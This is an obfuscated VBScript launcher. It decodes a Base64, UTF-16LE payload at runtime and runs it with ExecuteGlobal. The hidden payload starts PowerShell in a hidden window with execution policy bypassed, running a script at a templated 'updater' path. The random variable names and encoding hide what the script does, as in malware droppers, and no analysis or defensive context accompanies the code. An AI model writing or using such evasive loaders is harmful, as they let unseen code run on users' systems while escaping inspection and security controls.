Dim ocrompvk
ocrompvk = ""
ocrompvk = ocrompvk & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAb"
ocrompvk = ocrompvk & "QBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVw"
ocrompvk = ocrompvk & "BTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaAB"
ocrompvk = ocrompvk & "lAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0"
ocrompvk = ocrompvk & "AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1A"
ocrompvk = ocrompvk & "HQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAE"
ocrompvk = ocrompvk & "QAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACA"
ocrompvk = ocrompvk & "AcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAATgBvAHQA"
ocrompvk = ocrompvk & "aABpAG4AZwA="
Dim eeptbfqc : Set eeptbfqc = CreateObject("ADODB.Stream")
eeptbfqc.Type = 1 : eeptbfqc.Open
Dim xberdgwi : Set xberdgwi = CreateObject("MSXml2.DOMDocument").createElement("z")
xberdgwi.dataType = "bin.base64" : xberdgwi.text = ocrompvk
eeptbfqc.Write xberdgwi.nodeTypedValue
eeptbfqc.Position = 0 : eeptbfqc.Type = 2 : eeptbfqc.Charset = "UTF-16LE"
Dim vxomsavh : vxomsavh = eeptbfqc.ReadText : eeptbfqc.Close
ExecuteGlobal vxomsavh